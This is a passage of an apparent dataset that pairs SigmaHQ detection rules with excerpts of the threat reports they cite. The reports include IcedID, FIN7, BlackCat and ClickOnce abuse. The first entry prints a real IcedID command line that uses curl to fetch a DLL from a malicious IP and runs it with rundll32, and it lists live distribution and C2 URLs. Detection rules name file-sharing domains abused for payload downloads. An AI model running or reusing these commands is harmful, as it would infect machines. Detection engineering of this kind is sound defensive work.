    "markdown": "# IcedID | 09.28.2023 | Campaign 163487289 | TA577 *************************************** **URL**: https://themarijuanashow.com/rt/ **ZIP**: 96183d3cd4307ff21793b4eaf54ee2c6c7e387e7c5d896f159d980eb1344301a **DLL**: 1f80003416d85564aa437e72de131702a3a413b4d60611bf412f92ee9cf1f7ee *************************************** ### Exec >> ``` cmd /c C:\\Users\\Admin\\AppData\\Local\\Temp\\4DH.pdf.lnk cmd.exe /c fbV3 || ecHO fbV3 & PiNG fbV3 || CurL http://155.138.164.116/RfOhPtl/3p -o C:\\Users\\Admin\\AppData\\Local\\Temp\\fbV3.log & PiNG -n 3 fbV3 || ruNdlL32 C:\\Users\\Admin\\AppData\\Local\\Temp\\fbV3.log scab /k pechene634 & ExIT 'dXTUfOTzKLJv ``` **System**: `C:\\Windows\\system32\\PING.EXE` **Ping Command**: ``` PiNG -n 3 fbV3 ``` **RunDLL Command**: ``` ruNdlL32 C:\\Users\\Admin\\AppData\\Local\\Temp\\fbV3.log scab /k pechene634 ``` *************************************** ### DLL Distribution - http://155.138.164.116/RfOhPtl/3p - http://155.138.223.115/eM19/Qs1 *************************************** ### C2 Downloader - http://carsfootyelo.com/ ***************************************",
    "sigma_rule": {
      "title": "Suspicious File Download From IP Via Curl.EXE",
      "id": "5cb299fc-5fb1-4d07-b989-0644c68b6043",
      "status": "test",
      "description": "Detects potentially suspicious file downloads directly from IP addresses using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://github.com/pr0xylife/IcedID/blob/8dd1e218460db4f750d955b4c65b2f918a1db906/icedID_09.28.2023.txt"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-27",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_ip": {
          "CommandLine|re": "://[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "selection_ext": {
          "CommandLine|endswith": [
            ".bat",
            ".bat\"",
            ".dat",
            ".dat\"",
            ".dll",
            ".dll\"",
            ".exe",
            ".exe\"",
            ".gif",
            ".gif\"",
            ".hta",
            ".hta\"",
            ".jpeg",
            ".jpeg\"",
            ".log",
            ".log\"",
            ".msi",
            ".msi\"",
            ".png",
            ".png\"",
            ".ps1",
            ".ps1\"",
            ".psm1",
            ".psm1\"",
            ".vbe",
            ".vbe\"",
            ".vbs",
            ".vbs\"",
            ".bat'",
            ".dat'",
            ".dll'",
            ".exe'",
            ".gif'",
            ".hta'",
            ".jpeg'",
            ".log'",
            ".msi'",
            ".png'",
            ".ps1'",
            ".psm1'",
            ".vbe'",
            ".vbs'"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_direct_ip_susp_extensions.yml"
  },
  "134": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Suspicious File Download From File Sharing Domain Via Curl.EXE",
      "id": "56454143-524f-49fb-b1c6-3fb8b1ad41fb",
      "status": "experimental",
      "description": "Detects potentially suspicious file download from file sharing domains using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "selection_ext": {
          "CommandLine|endswith": [
            ".ps1",
            ".ps1'",
            ".ps1\"",
            ".dat",
            ".dat'",
            ".dat\"",
            ".msi",
            ".msi'",
            ".msi\"",
            ".bat",
            ".bat'",
            ".bat\"",
            ".exe",
            ".exe'",
            ".exe\"",
            ".vbs",
            ".vbs'",
            ".vbs\"",
            ".vbe",
            ".vbe'",
            ".vbe\"",
            ".hta",
            ".hta'",
            ".hta\"",
            ".dll",
            ".dll'",
            ".dll\"",
            ".psm1",
            ".psm1'",
            ".psm1\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_susp_file_sharing_domains.yml"
  },
  "135": {
    "url": "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
    "markdown": "# FIN7VEEAM Indicators of Compromise (IOCs) | Indicator type | Value | Note | | -------------- | ----- | ---- | | SHA1 | 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 | POWERTRASH \"icsnd16_64refl.ps1\" sample | | SHA1 | b621f8c5e9033718b4e9d47a2f0eccb9783f612a | DUBLOADER \"libcurl.dll\" sample | | SHA1 | e5480a47172e3f75dbf0384f4ca82c7b47910e0f | POWERTRASH \"icbt11801_64refl.ps1\" sample | | IP | 217.12.206.176 | DICELOADER C2 | | IP | 162.248.225.115 | DICELOADER C2 | | IP | 45.136.199.128 | DICELOADER C2 | | IP | 91.149.243.181 | DICELOADER C2 | | IP | 91.199.147.152 | DICELOADER C2 | | IP | 95.217.49.123 | DICELOADER C2 | | IP | 77.75.230.112",
    "sigma_rule": {
      "title": "Suspicious File Download From File Sharing Domain Via Curl.EXE",
      "id": "56454143-524f-49fb-b1c6-3fb8b1ad41fb",
      "status": "experimental",
      "description": "Detects potentially suspicious file download from file sharing domains using curl.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\curl.exe"
          },
          {
            "OriginalFileName": "curl.exe"
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": {
          "CommandLine|contains": [
            " -O",
            "--remote-name",
            "--output"
          ]
        },
        "selection_ext": {
          "CommandLine|endswith": [
            ".ps1",
            ".ps1'",
            ".ps1\"",
            ".dat",
            ".dat'",
            ".dat\"",
            ".msi",
            ".msi'",
            ".msi\"",
            ".bat",
            ".bat'",
            ".bat\"",
            ".exe",
            ".exe'",
            ".exe\"",
            ".vbs",
            ".vbs'",
            ".vbs\"",
            ".vbe",
            ".vbe'",
            ".vbe\"",
            ".hta",
            ".hta'",
            ".hta\"",
            ".dll",
            ".dll'",
            ".dll\"",
            ".psm1",
            ".psm1'",
            ".psm1\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_curl_download_susp_file_sharing_domains.yml"
  },
  "136": {
    "url": "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
    "markdown": "# Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution The contents of this blogpost was written by Nick Powers (@zyn3rgy) and Steven Flores (@0xthirteen), and is a written version of the content presented at Defcon30. With the barrier to entry for initial access ever increasing, we spent some time digging into potentially lesser-known weaponization options for ClickOnce deployments. A few of the hurdles we’d like to overcome by implementing these weaponization options include: - Install / execute application without administrative privileges - Reputable, known-good file(s) used during execution - Streamlined, minimal user interaction required - Ease of rerolling",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of ClickOnce Application",
      "id": "67bc0e75-c0a9-4cfc-8754-84a505b63c04",
      "status": "test",
      "description": "Detects potentially suspicious child processes of a ClickOnce deployment application",
      "references": [
        "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-06-12",
      "tags": [
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|contains": "\\AppData\\Local\\Apps\\2.0\\",
          "Image|endswith": [
            "\\calc.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dfsvc_suspicious_child_processes.yml"
  },
  "137": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md",
    "markdown": "# T1083 - File and Directory Discovery ## Description from ATT&CK > Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. > > Many command shell utilities can be used to obtain this information. Examples include `dir`, `tree`, `ls`, `find`, and `locate`.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather",
    "sigma_rule": {
      "title": "DirLister Execution",
      "id": "b4dc61f5-6cce-468e-a608-b48b469feaa2",
      "status": "test",
      "description": "Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md",
        "https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/"
      ],
      "author": "frack113",
      "date": "2022-08-20",
      "modified": "2023-02-04",
      "tags": [
        "attack.discovery",
        "attack.t1083"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "DirLister.exe"
          },
          {
            "Image|endswith": "\\dirlister.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use by users"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dirlister_execution.yml"
  },
  "138": {
    "url": "https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/",
    "markdown": "# BlackCat ransomware attacks not merely a byproduct of bad luck **Older hardware and outdated operating systems contribute to attacks** **July 14, 2022** Threat Research | BlackCat | Citrix | ESXi | featured | Security Operations | Sophos X-Ops | VMware | vpn --- A ransomware group attacking large organizations with malware called BlackCat has followed a consistent pattern over the past several months: The threat actors break into enterprise networks by exploiting vulnerabilities in unpatched or outdated firewall/VPN devices, then pivot to internal systems after establishing a foothold from the firewall. Since December 2021, Sophos has been called in",
    "sigma_rule": {
      "title": "DirLister Execution",
      "id": "b4dc61f5-6cce-468e-a608-b48b469feaa2",
      "status": "test",
      "description": "Detect the usage of \"DirLister.exe\" a utility for quickly listing folder or drive contents. It was seen used by BlackCat ransomware to create a list of accessible directories and files.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1083/T1083.md",
        "https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/"
      ],
      "author": "frack113",
      "date": "2022-08-20",
      "modified": "2023-02-04",
      "tags": [
        "attack.discovery",
        "attack.t1083"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "DirLister.exe"
          },
          {
            "Image|endswith": "\\dirlister.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use by users"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dirlister_execution.yml"
  },
  "139": {
    "url": "https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature",
    "markdown": "# Enable-WindowsOptionalFeature ## Syntax ``` Enable-WindowsOptionalFeature -FeatureName <String[]> [-PackageName <String>] [-All] [-LimitAccess] [-Source <String[]>] [-NoRestart] [-Online] [-WindowsDirectory <String>] [-SystemDrive <String>] [-LogPath <String>] [-ScratchDirectory <String>] [-LogLevel <LogLevel>] [<CommonParameters>] ``` ``` Enable-WindowsOptionalFeature -FeatureName <String[]> [-PackageName <String>] [-All] [-LimitAccess] [-Source <String[]>] [-NoRestart] -Path <String> [-WindowsDirectory <String>] [-SystemDrive <String>] [-LogPath <String>] [-ScratchDirectory <String>] [-LogLevel <LogLevel>] [<CommonParameters>] ``` ## Description The **Enable-WindowsOptionalFeature** cmdlet enables or restores an optional feature in a Windows image. Use the *Online* parameter to specify the running operating system on your local computer, or use the *Path* parameter to specify the location of a mounted Windows image. The *PackageName* parameter specifies",
    "sigma_rule": {
      "title": "PowerShell Web Access Feature Enabled Via DISM",
      "id": "7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f",
      "status": "test",
      "description": "Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse",
      "references": [
        "https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a",
        "https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41"
      ],
      "author": "Michael Haag",
      "date": "2024-09-03",
      "tags": [
        "attack.persistence",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dism.exe"
          },
          {
            "OriginalFileName": "DISM.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "WindowsPowerShellWebAccess",
            "/online",
            "/enable-feature"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate PowerShell Web Access installations by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_enable_powershell_web_access_feature.yml"
  },
  "140": {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a",
    "markdown": "# Cybersecurity Advisory ## Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations **Release Date:** August 28, 2024 **Alert Code:** AA24-241A ### Related topics: - Cyber Threats and Advisories - Malware, Phishing, and Ransomware - Nation-State Cyber Actors --- ## Summary The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Defense Cyber Crime Center (DC3) are releasing this joint Cybersecurity Advisory (CSA) to warn network defenders that, as of August 2024, a group of Iran-based cyber actors continues to exploit U.S. and foreign organizations. This includes organizations across several sectors in the U.S.",
    "sigma_rule": {
      "title": "PowerShell Web Access Feature Enabled Via DISM",
      "id": "7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f",
      "status": "test",
      "description": "Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse",
      "references": [
        "https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a",
        "https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41"
      ],
      "author": "Michael Haag",
      "date": "2024-09-03",
      "tags": [
        "attack.persistence",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dism.exe"
          },
          {
            "OriginalFileName": "DISM.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "WindowsPowerShellWebAccess",
            "/online",
            "/enable-feature"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate PowerShell Web Access installations by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_enable_powershell_web_access_feature.yml"
  },
  "141": {
    "url": "https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41",
    "markdown": "# PSWA.md ## Enable PowerShell Web Access like an APT Ref: CISA Advisory ### PowerShell: ``` # PrivCheck if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")) { Write-Warning \"Please run this script as an Administrator!\" Exit } # Install Windows PowerShell Web Access feature try { Install-WindowsFeature -Name WindowsPowerShellWebAccess -IncludeManagementTools Write-Host \"Windows PowerShell Web Access feature installed successfully.\" -ForegroundColor Green } catch { Write-Error \"Failed to install Windows PowerShell Web Access feature: $_\" Exit } # Install and configure IIS if not already installed if (!(Get-WindowsFeature Web-Server).Installed) { Install-WindowsFeature -Name Web-Server -IncludeManagementTools Write-Host \"IIS installed successfully.\" -ForegroundColor Green } # Configure PowerShell Web Access",
    "sigma_rule": {
      "title": "PowerShell Web Access Feature Enabled Via DISM",
      "id": "7e8f2d3b-9c1a-4f67-b9e8-8d9006e0e51f",
      "status": "test",
      "description": "Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse",
      "references": [
        "https://docs.microsoft.com/en-us/powershell/module/dism/enable-windowsoptionalfeature",
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-241a",
        "https://gist.github.com/MHaggis/7e67b659af9148fa593cf2402edebb41"
      ],
      "author": "Michael Haag",
      "date": "2024-09-03",
      "tags": [
        "attack.persistence",
        "attack.t1548.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\dism.exe"
          },
          {
            "OriginalFileName": "DISM.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "WindowsPowerShellWebAccess",
            "/online",
            "/enable-feature"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate PowerShell Web Access installations by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_enable_powershell_web_access_feature.yml"
  },
  "142": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism",
    "markdown": "",
    "sigma_rule": {
      "title": "Dism Remove Online Package",
      "id": "43e32da2-fdd0-4156-90de-50dfd62636f9",
      "status": "test",
      "description": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism",
        "https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html"
      ],
      "author": "frack113",
      "date": "2022-01-16",
      "modified": "2022-08-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_dismhost": {
          "Image|endswith": "\\DismHost.exe",
          "ParentCommandLine|contains|all": [
            "/Online",
            "/Disable-Feature"
          ]
        },
        "selection_dism": {
          "Image|endswith": "\\Dism.exe",
          "CommandLine|contains|all": [
            "/Online",
            "/Disable-Feature"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate script"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_remove.yml"
  },
  "143": {
    "url": "https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html",
    "markdown": "# Ransomware Actor Abuses Genshin Impact Anti-Cheat Driver to Kill Antivirus We investigate `mhyprot2.sys`, a vulnerable anti-cheat driver for the popular role-playing game Genshin Impact. The driver is currently being abused by a ransomware actor to kill antivirus processes and services for mass-deploying ransomware. **Date:** August 24, 2022 --- There have already been reports on code-signed rootkits like Netfilter, FiveSys, and Fire Chili. These rootkits are usually signed with stolen certificates or are falsely validated. However, when a legitimate driver is used as a rootkit, that’s a different story. Such is the case of *mhyprot2.sys*, a vulnerable anti-cheat driver for",
    "sigma_rule": {
      "title": "Dism Remove Online Package",
      "id": "43e32da2-fdd0-4156-90de-50dfd62636f9",
      "status": "test",
      "description": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md#atomic-test-26---disable-windows-defender-with-dism",
        "https://www.trendmicro.com/en_us/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus.html"
      ],
      "author": "frack113",
      "date": "2022-01-16",
      "modified": "2022-08-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_dismhost": {
          "Image|endswith": "\\DismHost.exe",
          "ParentCommandLine|contains|all": [
            "/Online",
            "/Disable-Feature"
          ]
        },
        "selection_dism": {
          "Image|endswith": "\\Dism.exe",
          "CommandLine|contains|all": [
            "/Online",
            "/Disable-Feature"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "Legitimate script"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dism_remove.yml"
  },
  "144": {
    "url": "https://redcanary.com/blog/child-processes/",
    "markdown": "# Babysitting child processes Our third Diary of a Detection Engineer explores why baseline knowledge of common executables—such as whether they normally spawn child processes—is key to detecting malicious behavior. *Originally published June 16, 2021. Last modified April 30, 2024.* --- In early March 2021, an event fired based on `scrcons.exe` spawning a child process. The child process was `dllhost.exe` with no command-line arguments. Sarah Lewis, the detection engineer working the queue at the time, needed to quickly make sense of the event. She knew that lacking sufficient context, her series of questions in the resulting triage that would follow",
    "sigma_rule": {
      "title": "Dllhost.EXE Execution Anomaly",
      "id": "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
      "status": "test",
      "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08",
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-27",
      "modified": "2023-05-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dllhost.exe",
          "CommandLine": [
            "dllhost.exe",
            "dllhost"
          ]
        },
        "filter_main_null": {
          "CommandLine": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dllhost_no_cli_execution.yml"
  },
  "145": {
    "url": "https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08",
    "markdown": "",
    "sigma_rule": {
      "title": "Dllhost.EXE Execution Anomaly",
      "id": "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
      "status": "test",
      "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08",
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-27",
      "modified": "2023-05-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dllhost.exe",
          "CommandLine": [
            "dllhost.exe",
            "dllhost"
          ]
        },
        "filter_main_null": {
          "CommandLine": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dllhost_no_cli_execution.yml"
  },
  "146": {
    "url": "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Dllhost.EXE Execution Anomaly",
      "id": "e7888eb1-13b0-4616-bd99-4bc0c2b054b9",
      "status": "test",
      "description": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes.",
      "references": [
        "https://redcanary.com/blog/child-processes/",
        "https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08",
        "https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-27",
      "modified": "2023-05-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\dllhost.exe",
          "CommandLine": [
            "dllhost.exe",
            "dllhost"
          ]
        },
        "filter_main_null": {
          "CommandLine": null
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_dllhost_no_cli_execution.yml"
  },
  "147": {
    "url": "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/",
